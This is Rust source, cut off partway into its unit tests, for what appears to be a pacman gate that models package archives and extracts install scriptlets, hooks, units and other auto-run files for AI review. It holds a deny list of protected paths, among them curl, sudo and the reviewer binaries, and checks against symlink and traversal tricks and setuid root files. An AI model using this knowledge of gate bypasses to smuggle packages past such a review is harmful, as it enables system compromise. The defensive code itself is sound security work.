//! What a package archive holds, and the files in it that run, or grant
//! privileges, on their own: without the install scriptlet, pacman hooks and
//! their scripts run on later transactions, sudoers and polkit rules grant
//! root, enabled systemd units, drop-ins, udev, sysctl and modprobe rules,
//! tmpfiles and sysusers entries run at boot or on events, initcpio and
//! kernel-install hooks run at every kernel update, and login scripts,
//! autostart entries, cron jobs and D-Bus services run on their own
//! schedule. The pacman gate reviews these with the AI alongside the
//! scriptlet; the rest of the payload is not reviewed.
//!
//! Every decision is made against one exact model of the archive: two full
//! listings (names only, and details with numeric owners) zipped line by
//! line. A name libalpm would install somewhere other than where Guardian
//! reads it (`etc//x`, `/etc/x`, `etc/../x`), a duplicate entry (a second
//! `.INSTALL`), a non-regular metadata file, an entry under a symbolic-link
//! directory or an unknown entry type makes the whole package fail closed.
//! Links are resolved inside the model, never on disk, and only regular
//! files are extracted, into a private directory, and read without
//! following links. The archive is opened once; every pass reads that open
//! file, and its path must still name it at the end.

use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::fs::{self, File, Metadata, OpenOptions};
use std::io::Read;
use std::os::fd::AsRawFd;
use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
use std::path::{Path, PathBuf};

use crate::autorun::{
    executed_paths, is_alias_of_reviewed_directory, is_auto_run, is_auto_run_directory,
};
use crate::config::model::SourceClass;
use crate::content::{self, Content};
use crate::error::{Error, IoContext};
use crate::rules;
use crate::sandbox::Workspace;
use crate::scan::MAX_TEXT_FILE_SIZE;
use crate::tools::{self, Limits};

/// The archive's own metadata; any other name starting with `.` is refused.
const METADATA: &[&str] = &[".PKGINFO", ".BUILDINFO", ".MTREE", ".INSTALL", ".CHANGELOG"];

/// More matching files than any real package ships; a payload beyond these
/// limits is not reviewed, and the review is incomplete.
const MAX_FILES: usize = 2000;
const MAX_TOTAL: u64 = 32 * 1024 * 1024;
/// Symbolic links followed from one entry before giving up.
const MAX_HOPS: usize = 40;

const LISTING_LIMITS: Limits = Limits {
    timeout_secs: 300,
    max_output: 64 * 1024 * 1024,
};
const EXTRACT_LIMITS: Limits = Limits {
    timeout_secs: 300,
    max_output: 1024 * 1024,
};
const C_LOCALE: &[(&str, &str)] = &[("LC_ALL", "C")];

/// `O_NOFOLLOW` and `O_NONBLOCK` in the Linux generic ABI (`x86_64`,
/// `aarch64` and friends differ only for `O_NOFOLLOW`).
#[cfg(target_arch = "x86_64")]
pub const O_NOFOLLOW: i32 = 0o400_000;
#[cfg(not(target_arch = "x86_64"))]
pub const O_NOFOLLOW: i32 = 0o100_000;
pub const O_NONBLOCK: i32 = 0o4000;

/// Who may ship a protected path.
#[derive(Clone, Copy, Debug)]
enum Owner {
    /// No package: Guardian's own configuration and hook link.
    Nobody,
    /// The `omarchy-guardian` package, installed from a local archive
    /// (`install.sh` uses `-U`) or an official repository: a third-party
    /// repository offering a package of that name does not get to replace
    /// the gate.
    Guardian,
    /// These packages, from an official repository only.
    Packages(&'static [&'static str]),
    /// Any package from an official repository: the tools the gate runs.
    Official,
}

/// Paths whose replacement disarms the gate: its policy, its reviewer and
/// the tools it trusts. A trailing `/` protects the whole directory.
const PROTECTED: &[(&str, Owner)] = &[
    ("etc/omarchy-guardian/", Owner::Nobody),
    ("etc/pacman.d/hooks/omarchy-guardian.hook", Owner::Nobody),
    ("usr/bin/omarchy-guardian", Owner::Guardian),
    ("usr/lib/omarchy-guardian/", Owner::Guardian),
    ("usr/share/omarchy-guardian/", Owner::Guardian),
    ("usr/bin/opencode", Owner::Packages(&["opencode"])),
    ("usr/local/bin/opencode", Owner::Packages(&["opencode"])),
    ("usr/bin/claude", Owner::Packages(&["claude-code"])),
    ("usr/local/bin/claude", Owner::Packages(&["claude-code"])),
    ("opt/claude-code/", Owner::Packages(&["claude-code"])),
    ("usr/bin/bsdtar", Owner::Official),
    ("usr/bin/pacman", Owner::Official),
    ("usr/bin/pacman-conf", Owner::Official),
    ("usr/bin/timeout", Owner::Official),
    ("usr/bin/kill", Owner::Official),
    ("usr/bin/curl", Owner::Official),
    ("usr/bin/bwrap", Owner::Official),
    ("usr/bin/runuser", Owner::Official),
    ("usr/bin/env", Owner::Official),
    ("usr/bin/sudo", Owner::Official),
];

/// Whether `package` (of `class`) may ship `path`; `trusted` names extra
/// reviewer packages the root-owned system configuration allows.
fn protected_violation(
    path: &str,
    package: &str,
    class: SourceClass,
    trusted: &[String],
) -> Option<String> {
    let (protected, owner) = PROTECTED.iter().find(|(protected, _)| {
        if let Some(directory) = protected.strip_suffix('/') {
            path == directory || path.starts_with(protected)
        } else {
            path == *protected
        }
    })?;
    let official = class == SourceClass::Official;
    let allowed = match owner {
        Owner::Nobody => false,
        Owner::Guardian => package == "omarchy-guardian" && class != SourceClass::ThirdPartyRepo,
        Owner::Packages(packages) => {
            (official && packages.contains(&package)) || trusted.iter().any(|name| name == package)
        }
        Owner::Official => official,
    };
    (!allowed).then(|| {
        format!(
            "{package} ships /{path}, which only {} may provide: it could disarm Guardian",
            match owner {
                Owner::Nobody => "no package".to_string(),
                Owner::Guardian =>
                    "the omarchy-guardian package, installed from a local archive or an official repository"
                        .to_string(),
                Owner::Packages(packages) => format!(
                    "{} from an official repository (or a package named in [pacman] trusted_reviewer_packages)",
                    packages.join(" or ")
                ),
                Owner::Official => "a package from an official repository".to_string(),
            },
            path = protected.trim_end_matches('/')
        )
    })
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Kind {
    File,
    Directory,
    Symlink(String),
    /// A hard link to an earlier regular entry of the archive.
    HardLink(String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct Entry {
    path: String,
    size: u64,
    kind: Kind,
    /// A regular file installed setuid or setgid root: it runs as root for
    /// whoever starts it, with no scriptlet involved.
    root_set_id: Option<&'static str>,
}

/// Undoes bsdtar's (and mtree's) escaping of names (`\\`, `\n`, `\t` and
/// octal `\ooo`); `None` for a name that is not UTF-8 or holds control
/// characters.
pub fn unescape(raw: &str) -> Option<String> {
    let mut bytes = Vec::with_capacity(raw.len());
    let mut input = raw.bytes().peekable();
    while let Some(byte) = input.next() {
        if byte != b'\\' {
            bytes.push(byte);
            continue;
        }
        let escaped = match input.next()? {
            b'\\' => b'\\',
            b'n' => b'\n',
            b't' => b'\t',
            b'r' => b'\r',
            b'a' => 7,
            b'b' => 8,
            b'f' => 12,
            b'v' => 11,
            digit @ b'0'..=b'7' => {
                let mut value = u32::from(digit - b'0');
                for _ in 0..2 {
                    let next = input.next().filter(u8::is_ascii_digit)?;
                    value = value * 8 + u32::from(next - b'0');
                }
                u8::try_from(value).ok()?
            }
            _ => return None,
        };
        bytes.push(escaped);
    }
    let text = String::from_utf8(bytes).ok()?;
    (!text.chars().any(char::is_control)).then_some(text)
}

/// Whether a listed mode (`-rwsr-xr-x`) with its numeric owner and group is
/// setuid or setgid root.
fn root_set_id(mode: &str, owner: &str, group: &str) -> Option<&'static str> {
    let set = |position: usize, id: &str| {
        matches!(mode.as_bytes().get(position), Some(b's' | b'S')) && id == "0"
    };
    if set(3, owner) {
        Some("setuid root")
    } else if set(6, group) {
        Some("setgid root")
    } else {
        None
    }
}

/// An entry under a symbolic-link directory is installed wherever that
/// link points, not where it is listed: such an archive is refused.
fn under_links(entries: &[Entry]) -> Result<(), String> {
    let links: HashSet<&str> = entries
        .iter()
        .filter(|entry| matches!(entry.kind, Kind::Symlink(_)))
        .map(|entry| entry.path.as_str())
        .collect();
    for entry in entries {
        let mut prefix = entry.path.as_str();
        while let Some((parent, _)) = prefix.rsplit_once('/') {
            if links.contains(parent) {
                return Err(format!(
                    "{} is inside {parent}, which is a symbolic link",
                    entry.path
                ));
            }
            prefix = parent;
        }
    }
    Ok(())
}

/// Builds the archive model from `bsdtar -tf` (names) and `bsdtar -tv
/// --numeric-owner` (details) output, refusing anything a real package
/// never contains.
fn parse_model(names: &str, details: &str) -> Result<Vec<Entry>, String> {
    let names: Vec<&str> = names.lines().collect();
    let details: Vec<&str> = details.lines().collect();
    if names.len() != details.len() {
        return Err("the archive's two listings disagree".into());
    }
    let mut entries: Vec<Entry> = Vec::with_capacity(names.len());
    let mut seen: HashMap<String, usize> = HashMap::new();
    for (raw_name, line) in names.iter().zip(&details) {
        let mut rest = *line;
        let mut fields = Vec::with_capacity(8);
        for _ in 0..8 {
            rest = rest.trim_start();
            let end = rest
                .find(char::is_whitespace)
                .ok_or_else(|| format!("unreadable listing line {line:?}"))?;
            fields.push(&rest[..end]);
            rest = &rest[end..];
        }
        let after = rest
            .strip_prefix(' ')
            .and_then(|rest| rest.strip_prefix(*raw_name))
            .ok_or_else(|| format!("unreadable listing line {line:?}"))?;
        let size: u64 = fields[4]
            .parse()
            .map_err(|_| format!("unreadable size in {line:?}"))?;
        let bad = || format!("an entry name Guardian refuses: {raw_name:?}");
        let mut path = unescape(raw_name).ok_or_else(bad)?;
        let kind = match (fields[0].chars().next(), after) {
            (Some('-'), "") => Kind::File,
            (Some('d'), "") => {
                if let Some(trimmed) = path.strip_suffix('/') {
                    path = trimmed.to_string();
                }
                Kind::Directory
            }
            (Some('l'), rest) => Kind::Symlink(
                rest.strip_prefix(" -> ")
                    .and_then(unescape)
                    .ok_or_else(bad)?,
            ),
            (Some('h'), rest) => Kind::HardLink(
                rest.strip_prefix(" link to ")
                    .and_then(unescape)
                    .ok_or_else(bad)?,
            ),
            _ => return Err(format!("an entry of a type Guardian refuses: {line:?}")),
        };
        if path.is_empty()
            || path.starts_with('/')
            || path
                .split('/')
                .any(|component| matches!(component, "" | "." | ".."))
        {
            return Err(bad());
        }
        let top = path.split('/').next().unwrap_or_default();
        if top.starts_with('.') {
            if !METADATA.contains(&path.as_str()) {
                return Err(bad());
            }
            if kind != Kind::File {
                return Err(format!("{path} is not a regular file"));
            }
        }
        if let Kind::HardLink(target) = &kind {
            let regular = seen
                .get(target)
                .is_some_and(|index| entries[*index].kind == Kind::File);
            if !regular {
                return Err(format!(
                    "{path} is a hard link to {target}, which is not an earlier regular file"
                ));
            }
        }
        if seen.insert(path.clone(), entries.len()).is_some() {
            return Err(format!("{path} appears more than once"));
        }
        let root_set_id = match kind {
            Kind::File | Kind::HardLink(_) => root_set_id(fields[0], fields[2], fields[3]),
            Kind::Directory | Kind::Symlink(_) => None,
        };
        entries.push(Entry {
            path,
            size,
            kind,
            root_set_id,
        });
    }
    under_links(&entries)?;
    Ok(entries)
}

/// Where a symbolic link leads, resolved inside the archive model.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Resolution {
    /// A regular file the package ships.
    Regular(String),
    /// Somewhere the package does not ship (another package's file).
    Outside(String),
}

/// A package archive opened once and modelled exactly.
pub struct Archive {
    path: PathBuf,
    file: File,
    identity: Identity,
    entries: Vec<Entry>,
    index: HashMap<String, usize>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct Identity {
    dev: u64,
    ino: u64,
    size: u64,
    mtime: i64,
}

impl Identity {
    fn of(metadata: &Metadata) -> Self {
        Self {
            dev: metadata.dev(),
            ino: metadata.ino(),
            size: metadata.len(),
            mtime: metadata.mtime(),
        }
    }
}

impl Archive {
    /// Opens `path` (not following a link), lists it twice and builds the
    /// model; any listing that is not a clean package fails.
    pub fn open(path: &Path) -> Result<Self, Error> {
        let file = OpenOptions::new()
            .read(true)
            .custom_flags(O_NOFOLLOW | O_NONBLOCK)
            .open(path)
            .at(path)?;
        let metadata = file.metadata().at(path)?;
        if !metadata.is_file() {
            return Err(Error::Refused(format!(
                "{} is not a regular file",
                path.display()
            )));
        }
        let mut archive = Self {
            path: path.to_path_buf(),
            file,
            identity: Identity::of(&metadata),
            entries: Vec::new(),
            index: HashMap::new(),
        };
        let names = archive.bsdtar(&["-tf".into(), "-".into()], LISTING_LIMITS)?;
        let details = archive.bsdtar(
            &[
                "-tv".into(),
                "--numeric-owner".into(),
                "-f".into(),
                "-".into(),
            ],
            LISTING_LIMITS,
        )?;
        archive.entries = parse_model(
            &String::from_utf8_lossy(&names),
            &String::from_utf8_lossy(&details),
        )
        .map_err(|reason| Error::Refused(format!("{}: {reason}", path.display())))?;
        archive.index = archive
            .entries
            .iter()
            .enumerate()
            .map(|(index, entry)| (entry.path.clone(), index))
            .collect();
        Ok(archive)
    }

    /// Runs bsdtar on the opened file (a fresh descriptor each time, so each
    /// pass reads from the start).
    fn bsdtar(&self, args: &[OsString], limits: Limits) -> Result<Vec<u8>, Error> {
        let stdin = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
        let captured =
            tools::run_with_stdin_file(Path::new(tools::BSDTAR), args, stdin, C_LOCALE, limits)?;
        if captured.status.success() {
            Ok(captured.stdout)
        } else {
            Err(Error::ToolFailed {
                tool: "bsdtar".into(),
                detail: format!("{}: {}", self.path.display(), captured.failure_detail()),
            })
        }
    }

    /// The path must still name the file that was reviewed.
    pub fn verify_unchanged(&self) -> Result<(), Error> {
        let current = fs::symlink_metadata(&self.path).at(&self.path)?;
        if current.is_file() && Identity::of(&current) == self.identity {
            Ok(())
        } else {
            Err(Error::Refused(format!(
                "{} changed while it was being reviewed",
                self.path.display()
            )))
        }
    }

    fn entry(&self, path: &str) -> Option<&Entry> {
        self.index.get(path).map(|index| &self.entries[*index])
    }

    /// The regular entry a file's content comes from: itself, or the
    /// original of a hard link.
    fn regular_source(&self, path: &str) -> String {
        match self.entry(path).map(|entry| &entry.kind) {
            Some(Kind::HardLink(original)) => original.clone(),
            _ => path.to_string(),
        }
    }

    /// Resolves the symbolic link at `link` with `target` inside the model.
    fn resolve(&self, link: &str, target: &str) -> Result<Resolution, String> {
        let mut link = link.to_string();
        let mut target = target.to_string();
        for _ in 0..MAX_HOPS {
            let mut parts: Vec<String> = if target.starts_with('/') {
                Vec::new()
            } else {
                let mut parent: Vec<String> = link.split('/').map(str::to_string).collect();
                parent.pop();
                parent
            };
            let components: Vec<&str> = target.split('/').collect();
            let mut outside = false;
            for (index, component) in components.iter().enumerate() {
                match *component {
                    "" | "." => {}
                    ".." => {
                        if parts.pop().is_none() {
                            return Err(format!("{link} links above the root of the package"));
                        }
                    }
                    name => {
                        parts.push(name.to_string());
                        let last = components[index + 1..]
                            .iter()
                            .all(|rest| matches!(*rest, "" | "."));
                        let here = parts.join("/");
                        match self.entry(&here).map(|entry| &entry.kind) {
                            Some(Kind::Symlink(_)) if !last => {
                                return Err(format!(
                                    "{link} links through {here}, which is a symbolic link"
                                ));
                            }
                            Some(Kind::File | Kind::HardLink(_)) if !last => {
                                return Err(format!("{link} links through the file {here}"));
                            }
                            None => outside = true,
                            _ => {}
                        }
                    }
                }
            }
            let resolved = parts.join("/");
            if outside || resolved.is_empty() {
                return Ok(Resolution::Outside(format!("/{resolved}")));
            }
            match self.entry(&resolved).map(|entry| &entry.kind) {
                Some(Kind::File) => return Ok(Resolution::Regular(resolved)),
                Some(Kind::HardLink(original)) => {
                    return Ok(Resolution::Regular(original.clone()));
                }
                Some(Kind::Directory) => {
                    return Err(format!("{link} links to the directory /{resolved}"));
                }
                Some(Kind::Symlink(next)) => {
                    link = resolved;
                    target.clone_from(next);
                }
                None => return Ok(Resolution::Outside(format!("/{resolved}"))),
            }
        }
        Err(format!("{link}: too many symbolic links"))
    }

    /// Extracts exactly `paths` (regular files of the model) and reads them
    /// back without following links, checking each has its listed size.
    fn extract(&self, paths: &[String]) -> Result<HashMap<String, Vec<u8>>, Error> {
        if paths.is_empty() {
            return Ok(HashMap::new());
        }
        let workspace = Workspace::create("payload")?;
        let mut args: Vec<OsString> = vec![
            "-x".into(),
            "--no-recursion".into(),
            "-f".into(),
            "-".into(),
            "-C".into(),
            workspace.path().into(),
            "--no-same-owner".into(),
            "--no-same-permissions".into(),
        ];
        for path in paths {
            args.push("--include".into());
            args.push(escape_pattern(path).into());
        }
        self.bsdtar(&args, EXTRACT_LIMITS)?;
        let mut read = HashMap::new();
        for path in paths {
            let expected = self.entry(path).map_or(0, |entry| entry.size);
            let bytes = read_extracted(workspace.path(), path)
                .map_err(|error| Error::Refused(format!("/{path}: {error}")))?;
            if bytes.len() as u64 != expected {
                return Err(Error::Refused(format!(
                    "/{path} was extracted with a different size than listed"
                )));
            }
            read.insert(path.clone(), bytes);
        }
        Ok(read)
    }
}

/// Glob characters in a file name are matched literally.
fn escape_pattern(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    for character in path.chars() {
        if matches!(character, '*' | '?' | '[' | ']' | '\\') {
            out.push('\\');
        }
        out.push(character);
    }
    out
}

/// Reads `rel` under `root` one component at a time, refusing any symbolic
/// link on the way and anything but a regular file at the end.
fn read_extracted(root: &Path, rel: &str) -> std::io::Result<Vec<u8>> {
    let mut path = root.to_path_buf();
    let components: Vec<&str> = rel.split('/').collect();
    for (index, component) in components.iter().enumerate() {
        path.push(component);
        let metadata = fs::symlink_metadata(&path)?;
        let last = index + 1 == components.len();
        if metadata.file_type().is_symlink() || (!last && !metadata.is_dir()) {
            return Err(std::io::Error::other("not a plain path in the extraction"));
        }
    }
    let file = OpenOptions::new()
        .read(true)
        .custom_flags(O_NOFOLLOW | O_NONBLOCK)
        .open(&path)?;
    if !file.metadata()?.is_file() {
        return Err(std::io::Error::other("not a regular file"));
    }
    let mut bytes = Vec::new();
    file.take(MAX_TEXT_FILE_SIZE + 1).read_to_end(&mut bytes)?;
    Ok(bytes)
}

/// One payload file for the review, with its content as classified.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadFile {
    pub path: String,
    pub content: Content,
    /// For a program a reviewed hook or unit runs: that file.
    pub run_by: Option<String>,
    /// The file as shipped: its bytes, or its link target for a symbolic
    /// link, to compare with what is installed.
    shipped: Shipped,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Shipped {
    Bytes(Vec<u8>),
    /// A link's target, and what it leads to when the package ships that
    /// too: a unit that changed behind the same enabling link is a change.
    Link {
        target: String,
        content: Option<Vec<u8>>,
    },
    /// A script another reviewed file runs: always reviewed.
    Unknown,
}

impl PayloadFile {
    /// Whether the same file is already installed under `root` (`/` in
    /// production): identical bytes, or a link with the same target that
    /// leads to identical bytes. Such a file adds nothing new, so an
    /// upgrade does not review it again. A file that cannot be read (for
    /// example root-only) counts as changed.
    pub fn is_installed_unchanged(&self, root: &Path) -> bool {
        let installed = root.join(&self.path);
        match &self.shipped {
            Shipped::Bytes(bytes) => {
                fs::symlink_metadata(&installed).is_ok_and(|metadata| {
                    metadata.is_file() && metadata.len() == bytes.len() as u64
                }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
            }
            Shipped::Link { target, content } => {
                fs::read_link(&installed).is_ok_and(|current| current == Path::new(target))
                    && content.as_ref().is_none_or(|bytes| {
                        // Only a regular file of that size is read.
                        fs::metadata(&installed).is_ok_and(|metadata| {
                            metadata.is_file() && metadata.len() == bytes.len() as u64
                        }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
                    })
            }
            Shipped::Unknown => false,
        }
    }
}

/// What the pacman gate reviews in one archive.
pub struct Review {
    /// The install scriptlet, classified (see `content::classify`).
    pub install: Option<Content>,
    pub files: Vec<PayloadFile>,
    /// Files installed setuid or setgid root, with which of the two, but
    /// for the sandbox helper of a Chromium-based program.
    pub root_set_id: Vec<(String, &'static str)>,
}

/// An auto-run entry and what its content is read from.
type Source<'a> = (&'a Entry, Resolution);

/// Reviews `archive` for the pacman gate: `package` must be the name its
/// `.PKGINFO` declares, no protected path may be shipped by the wrong
/// package, and the install scriptlet and auto-run files are extracted
/// and classified. `trusted` names extra reviewer packages the system
/// configuration allows.
pub fn review(
    archive: &Archive,
    package: &str,
    class: SourceClass,
    trusted: &[String],
) -> Result<Review, Error> {
    let refuse = |reason: String| Error::Refused(format!("{}: {reason}", archive.path.display()));
    for entry in &archive.entries {
        if let Some(reason) = protected_violation(&entry.path, package, class, trusted) {
            return Err(refuse(reason));
        }
    }

    let (wanted, sources) = plan_reads(archive).map_err(refuse)?;
    let mut read = archive.extract(&wanted)?;

    // Scripts that reviewed hooks and units run, when this package ships
    // them, are reviewed as well (read in a second, bounded extraction).
    let executed = executed_scripts(archive, &sources, &read);
    if !executed.is_empty() {
        let mut more: Vec<String> = executed
            .iter()
            .map(|(program, _)| archive.regular_source(program))
            .collect();
        more.sort();
        more.dedup();
        let mut all = wanted.clone();
        all.extend(more.iter().cloned());
        check_limits(archive, &all, sources.len() + executed.len()).map_err(refuse)?;
        read.extend(archive.extract(&more)?);
    }

    let pkginfo =
        String::from_utf8_lossy(read.get(".PKGINFO").map_or(&[][..], Vec::as_slice)).into_owned();
    let declared = pkginfo
        .lines()
        .find_map(|line| line.strip_prefix("pkgname = "))
        .map(str::trim);
    if declared != Some(package) {
        return Err(refuse(format!(
            ".PKGINFO names {:?}, not the transaction target {package}",
            declared.unwrap_or_default()
        )));
    }

    let install = read
        .get(".INSTALL")
        .map(|bytes| content::classify(".INSTALL", false, true, bytes));
    let mut files = payload_files(&sources, &read);
    for (program, by) in executed {
        let bytes = read
            .get(&archive.regular_source(&program))
            .map_or(&[][..], Vec::as_slice);
        files.push(PayloadFile {
            content: annotated(
                content::classify_payload(&program, bytes),
                &format!("# /{program}, run by /{by}\n"),
            ),
            path: program,
            run_by: Some(by),
            shipped: Shipped::Unknown,
        });
    }
    files.sort_by(|left, right| left.path.cmp(&right.path));
    let root_set_id = archive
        .entries
        .iter()
        .filter(|entry| !is_chromium_helper(archive, &entry.path))
        .filter_map(|entry| Some((entry.path.clone(), entry.root_set_id?)))
        .collect();
    Ok(Review {
        install,
        files,
        root_set_id,
    })
}

/// Where the link at `link` with `target` leads, by its text alone
/// (relative to `/`). `None` when it climbs above the root, or steps back
/// (`..`) after a name: that name may be a link on the system, and the
/// text would then say one place while the system goes to another.
fn lexical_target(link: &str, target: &str) -> Option<String> {
    let mut parts: Vec<&str> = if target.starts_with('/') {
        Vec::new()
    } else {
        let mut parent: Vec<&str> = link.split('/').collect();
        parent.pop();
        parent
    };
    let mut named = false;
    for component in target.split('/') {
        match component {
            "" | "." => {}
            ".." if named => return None,
            ".." => {
                parts.pop()?;
            }
            name => {
                named = true;
                parts.push(name);
            }
        }
    }
    Some(parts.join("/"))
}

/// The setuid helper of a Chromium-based program, by its name and by the
/// runtime files such a program keeps beside it, outside the directories
/// commands are found in. Its content is a binary nobody reads, like every
/// other program a package ships; this only tells it from a file that
/// merely borrows the name.
fn is_chromium_helper(archive: &Archive, path: &str) -> bool {
    let on_path = ["usr/bin/", "usr/sbin/", "usr/local/", "bin/", "sbin/"]
        .iter()
        .any(|directory| path.starts_with(directory));
    let beside = |name: &str| {
        path.rsplit_once('/')
            .is_some_and(|(directory, _)| archive.entry(&format!("{directory}/{name}")).is_some())
    };
    rules::is_sandbox_helper(path) && !on_path && beside("icudtl.dat") && beside("resources.pak")
}

/// The files to extract (`.PKGINFO`, `.INSTALL`, the auto-run entries and
/// what their links resolve to), within the limits, and each auto-run
/// entry's source.
fn plan_reads(archive: &Archive) -> Result<(Vec<String>, Vec<Source<'_>>), String> {
    let mut wanted: Vec<String> = Vec::new();
    match archive.entry(".PKGINFO") {
        Some(entry) if entry.size <= MAX_TEXT_FILE_SIZE => wanted.push(".PKGINFO".into()),
        Some(_) => return Err(".PKGINFO is too large".into()),
        None => return Err("the package has no .PKGINFO".into()),
    }
    if let Some(entry) = archive.entry(".INSTALL") {
        if entry.size > MAX_TEXT_FILE_SIZE {
            return Err("the install scriptlet exceeds the 2 MiB review limit".into());
        }
        wanted.push(".INSTALL".into());
    }
    let mut sources = Vec::new();
    for entry in &archive.entries {
        // What such a link leads to would be read as that directory's
        // files, wherever the package ships them: fine only when they
        // are auto-run files of the same kind there too (systemd's own
        // `etc/xdg/systemd/user -> ../../systemd/user`).
        if let Kind::Symlink(target) = &entry.kind
            && is_auto_run_directory(&entry.path)
        {
            if lexical_target(&entry.path, target)
                .is_some_and(|leads| is_alias_of_reviewed_directory(&entry.path, &leads))
            {
                continue;
            }
            return Err(format!(
                "/{} is a symbolic link standing in for a directory whose files run on their own",
                entry.path
            ));
        }
        if matches!(entry.kind, Kind::Directory) || !is_auto_run(&entry.path) {
            continue;
        }
        let source = match &entry.kind {
            Kind::Symlink(target) => archive.resolve(&entry.path, target)?,
            _ => Resolution::Regular(archive.regular_source(&entry.path)),
        };
        if let Resolution::Regular(path) = &source {
            wanted.push(path.clone());
        }
        sources.push((entry, source));
    }
    wanted.sort();
    wanted.dedup();
    check_limits(archive, &wanted, sources.len())?;
    Ok((wanted, sources))
}

/// Shipped, non-auto-run scripts that the reviewed hooks and units run,
/// with the file that runs each.
fn executed_scripts(
    archive: &Archive,
    sources: &[Source<'_>],
    read: &HashMap<String, Vec<u8>>,
) -> Vec<(String, String)> {
    let mut executed: Vec<(String, String)> = Vec::new();
    for (entry, source) in sources {
        let Resolution::Regular(path) = source else {
            continue;
        };
        let Some(text) = read
            .get(path)
            .and_then(|bytes| std::str::from_utf8(bytes).ok())
        else {
            continue;
        };
        for program in executed_paths(text) {
            // Scripts are small; a large program is a compiled binary, left
            // to the package's own review like every other program.
            let shipped = matches!(
                archive.entry(&program).map(|found| &found.kind),
                Some(Kind::File | Kind::HardLink(_))
            ) && archive
                .entry(&archive.regular_source(&program))
                .is_some_and(|found| found.size <= MAX_TEXT_FILE_SIZE);
            if shipped && !is_auto_run(&program) && !read.contains_key(&program) {
                executed.push((program, entry.path.clone()));
            }
        }
    }
    executed.sort();
    executed.dedup_by(|left, right| left.0 == right.0);
    executed
}

/// Each auto-run entry as a payload file: its own content, or a link's
/// resolved content (or a note that the package does not ship it).
fn payload_files(sources: &[Source<'_>], read: &HashMap<String, Vec<u8>>) -> Vec<PayloadFile> {
    sources
        .iter()
        .map(|(entry, source)| {
            let (content, shipped) = match (&entry.kind, source) {
                (Kind::Symlink(target), Resolution::Regular(resolved)) => {
                    let bytes = read.get(resolved).map_or(&[][..], Vec::as_slice);
                    let header = format!(
                        "# {} is a symbolic link to {target}, whose content follows.\n",
                        entry.path
                    );
                    (
                        annotated(content::classify_payload(resolved, bytes), &header),
                        Shipped::Link {
                            target: target.clone(),
                            content: Some(bytes.to_vec()),
                        },
                    )
                }
                (Kind::Symlink(target), Resolution::Outside(resolved)) => (
                    Content::Text(format!(
                        "# {} is a symbolic link to {target} ({resolved}), which this package does not ship.\n",
                        entry.path
                    )),
                    Shipped::Link {
                        target: target.clone(),
                        content: None,
                    },
                ),
                (_, Resolution::Regular(path)) => {
                    let bytes = read.get(path).cloned().unwrap_or_default();
                    (
                        content::classify_payload(&entry.path, &bytes),
                        Shipped::Bytes(bytes),
                    )
                }
                (_, Resolution::Outside(_)) => (Content::Undecodable, Shipped::Unknown),
            };
            PayloadFile {
                path: entry.path.clone(),
                content,
                run_by: None,
                shipped,
            }
        })
        .collect()
}

/// `content` with `header` before its text.
fn annotated(content: Content, header: &str) -> Content {
    match content {
        Content::Text(text) => Content::Text(format!("{header}{text}")),
        Content::Lossy { text, replaced } => Content::Lossy {
            text: format!("{header}{text}"),
            replaced,
        },
        other => other,
    }
}

/// Counts and sizes, from the model, before anything is extracted.
fn check_limits(archive: &Archive, wanted: &[String], auto_run: usize) -> Result<(), String> {
    let total: u64 = wanted
        .iter()
        .filter_map(|path| archive.entry(path))
        .map(|entry| entry.size)
        .sum();
    if auto_run > MAX_FILES || total > MAX_TOTAL {
        return Err(format!(
            "{auto_run} auto-run files ({} KiB) exceed the review limits",
            total / 1024
        ));
    }
    if let Some(entry) = wanted
        .iter()
        .filter_map(|path| archive.entry(path))
        .find(|entry| entry.size > MAX_TEXT_FILE_SIZE)
    {
        return Err(format!(
            "auto-run file /{} exceeds the 2 MiB review limit",
            entry.path
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::path::Path;
    use std::process::Command;

    use super::{
        Archive, Entry, Kind, Resolution, lexical_target, parse_model, protected_violation, review,
        root_set_id, unescape,
    };
    use crate::config::model::SourceClass;
    use crate::content::Content;
    use crate::test_support::{TempDir, tool_available};

    #[test]
    fn names_are_unescaped_and_control_characters_refused() {
        assert_eq!(
            unescape(r"system-systemd\\x2dcryptsetup.slice").as_deref(),
            Some(r"system-systemd\x2dcryptsetup.slice")
        );
        assert_eq!(unescape(r"caf\303\251").as_deref(), Some("café"));
        assert_eq!(unescape(r"nl\nx"), None);
        assert_eq!(unescape(r"x\351"), None);
        assert_eq!(unescape(r"bad\q"), None);
    }

    #[test]
    fn files_installed_setuid_or_setgid_root_are_told_apart() {
        assert_eq!(root_set_id("-rwsr-xr-x", "0", "0"), Some("setuid root"));
        assert_eq!(root_set_id("-rwSr--r--", "0", "100"), Some("setuid root"));
        assert_eq!(root_set_id("-rwxr-sr-x", "0", "0"), Some("setgid root"));
        // To another user or group, or not set at all.
        assert_eq!(root_set_id("-rwsr-xr-x", "1000", "0"), None);
        assert_eq!(root_set_id("-rwxr-sr-x", "0", "5"), None);
        assert_eq!(root_set_id("-rwxr-xr-x", "0", "0"), None);
        assert_eq!(root_set_id("-rwxr-xr-t", "0", "0"), None);

        let names = ".PKGINFO\nusr/bin/x\nusr/bin/dir/\n";
        let details = [
            detail('-', 10, ".PKGINFO"),
            "-rwsr-xr-x  0 0      0           9 Sep 30 22:51 usr/bin/x".to_string(),
            "drwsr-sr-x  0 0      0           0 Sep 30 22:51 usr/bin/dir/".to_string(),
        ]
        .join("\n");
        let model = parse_model(names, &details).unwrap();
        let set: Vec<Option<&str>> = model.iter().map(|entry| entry.root_set_id).collect();
        assert_eq!(set, [None, Some("setuid root"), None]);
    }

    fn detail(kind: char, size: u64, rest: &str) -> String {
        format!("{kind}rw-r--r--  0 1000   1000   {size:>6} Sep 30 22:51 {rest}")
    }

    #[test]
    fn the_model_zips_both_listings_with_any_owner_and_link_names() {
